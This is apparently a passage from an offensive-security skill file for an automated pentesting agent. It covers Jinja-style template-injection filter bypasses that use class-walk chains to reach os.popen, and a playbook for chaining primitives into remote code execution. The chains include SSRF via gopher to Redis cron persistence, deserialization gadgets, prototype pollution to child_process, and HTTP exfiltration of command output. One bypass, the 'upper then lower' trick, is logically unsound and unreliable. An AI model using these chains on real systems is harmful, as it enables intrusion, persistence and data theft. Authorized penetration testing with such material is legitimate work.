The sink is `{{ user_input | filter }}` not `{{ user_input }}` — a filter runs before the class-walk primitive reaches `os.popen`. Break the filter's output shape:

- If the filter is `| upper`, use `{{ 'os'|upper|lower }}` — the filter's uppercasing gives `OS` then lower-cases back to `os`, reaching the same primitive.
- If the filter is `| escape`, use `{{ request.__class__.__init__.__globals__ }}` — HTML-escaping doesn't affect the class-walk chain because the chain doesn't contain HTML-metacharacters.
- If the filter is a length constraint (`| truncate(50)`), split the payload across two sinks or use a shorter chain (`{{ get_flashed_messages.__globals__ }}` for Flask's shorter route).

The class fingerprint: identify which filter chain runs on the sink, then find a class-walk expression whose output survives the filter. Load `ssti` for the per-engine filter surface and `rce_novel_deep` for the SandboxJS/JS-template constructor-chain frontier.

## Composite Chain Playbook

Every RCE finding worth reporting includes a composite chain — the primitive that lands, the step that escalates, the impact. The base file's Testing Methodology (1) identifies sinks, (2) establishes an oracle, (3) confirms context, (4) maps boundaries, (5) progresses to control. The advanced discipline is: for each hop, name the *capability transferred* to the next hop, and route to the sibling skill that owns the next primitive.

- **Argument injection primitive → arbitrary git-upload-pack flags (base file's CVE-2025-21613 example)** → routing to `argument_injection` for the general sub-sink matrix and this file's git-family surface for the specific tool.
- **BatBadBut spawn injection → cmd.exe re-parse → subprocess command (this file's Windows CreateProcess block)** → routing back to the base file's post-exploitation section for enumeration and persistence.
- **Deserialization confirmation ladder → URLDNS Level 0 detection → CommonsCollections Level 2/5 exec (this file's confirmation block)** → routing to `insecure_deserialization` for the gadget catalog and the base file's confirmation-primitive ladder for the levels.
- **PP source of pollution → child_process gadget → V8 inspector → arbitrary JS in-process** → routing to `prototype_pollution` for the source-of-pollution methodology and `rce_novel_deep` for the runtime-scale GHunter gadget table.
- **SSRF → gopher → Redis → cron persistence** → routing to `ssrf_advanced_deep` for gopher construction and this file for the confirmation methodology.
- **Template injection filter bypass → class-walk chain → os.popen → HTTP exfil of `id` output** → routing to `ssti` for engine specifics and `rce_novel_deep` for the class-walk / constructor-chain frontier.

Each hop reports what capability it transfers, not "these things might combine." A finding is a chain when every arrow between primitives is a named capability.

## Summary

Advanced RCE depth is where the base's oracle discipline meets the class fingerprints. On Windows, the CreateProcess/cmd.exe parser-differential breaks the array-form safety invariant for batch targets across every runtime that hasn't shipped caller-side escaping; anywhere a documented sub-sink flag exists, argument injection reaches shell; every deserialization signal must climb the confirmation ladder before it counts as exec. Every real finding is a composite chain routed by capability across sibling skills. Load `rce_novel_deep.md` for the 2024–2026 published-instance frontier.
